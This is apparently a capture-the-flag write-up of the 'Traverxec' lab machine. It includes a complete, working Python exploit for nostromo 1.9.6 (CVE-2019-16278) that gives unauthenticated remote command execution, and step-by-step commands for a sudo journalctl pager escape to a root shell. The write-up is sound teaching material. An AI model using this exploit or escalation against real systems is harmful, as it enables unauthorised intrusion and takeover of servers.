Phase 1

Initial Access — nostromo Path Traversal RCE (CVE-2019-16278)

CVE-2019-16278 — how %0d bypasses the path check nostromo validates URL paths to prevent directory traversal. But the %0d character (carriage return) confuses the validator — it sees the path as safe, but the request handler interprets /.%0d./ as /../. This lets the attacker traverse out of the document root and reach /bin/sh, executing arbitrary commands. Think of it as a newline character tricking the bouncer into looking the other way.

Python3 Exploit

#!/usr/bin/env python3
"""CVE-2019-16278 — nostromo 1.9.6 RCE"""
import sys, socket

def cve(target, port, cmd):
    soc = socket.socket()
    soc.connect((target, int(port)))
    payload = (
        'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\n'
        'Content-Length: 1\r\n\r\n'
        'echo\necho\n{} 2>&1'.format(cmd)
    )
    soc.send(payload.encode())
    response = b""
    try:
        while True:
            chunk = soc.recv(1024)
            if not chunk: break
            response += chunk
    except: pass
    print(response.decode('utf-8', errors='ignore'))

if __name__ == "__main__":
    cve(sys.argv[1], sys.argv[2], sys.argv[3])

nostromo homedirs explained When homedirs is enabled, nostromo serves each user's public_www directory via /~username/. Even though /home/david is locked (no read permission for www-data), the public_www subdirectory is explicitly exposed by the web server config. It's like the room door is locked, but there's a public display case right outside it.

Phase 3

Privilege Escalation — sudo journalctl → less Pager Escape

Discovery

david@traverxec:~/bin$ cat server-stats.sh
#!/bin/bash
cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat

david can run sudo journalctl without a password. The script pipes to cat to avoid the pager, but we can run the command directly without the pipe.

Pager escape — how less gives root When journalctl output is taller than the terminal, it spawns less as a pager. Since journalctl runs as root via sudo, less also runs as root. Inside less, typing ! opens a command prompt — and !/bin/bash spawns a root shell. The trick: shrink the terminal window to 3-4 lines so the output can't fit on one screen, forcing the pager to activate.

Exploitation

# Step 1: Shrink terminal window to 3-4 lines tall
# Step 2: Run journalctl (without the | cat pipe)
david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service

# Step 3: less activates (shows : prompt at bottom)
# Step 4: Type !/bin/bash and press Enter
!/bin/bash

root@traverxec:~# cat /root/root.txt

Appendix

Key Takeaways

Obscure web servers = easy CVEs.

nostromo is rarely used and rarely patched. CVE-2019-16278 is a trivial pre-auth RCE using %0d path traversal. Always searchsploit the exact version.

Web server configs reveal hidden directories.

nostromo's homedirs_public exposed public_www even though the parent /home/david was locked. Always read the web server config after getting a shell.

Backup archives in public directories are treasure.

backup-ssh-identity-files.tgz in public_www contained david's encrypted SSH key. Weak passphrase (hunter) fell to john instantly.

Any sudo command that invokes a pager can escalate.

journalctl, man, git log, systemctl status — all use less as default pager. If you can sudo any of these, shrink the terminal and type !/bin/bash for root. Check GTFOBins for the full list.

Terminal size is a tool, not just a preference.

A small terminal forces pager activation. Some escalation techniques only work when the output overflows the screen — always try resizing if a pager-based attack doesn't trigger.
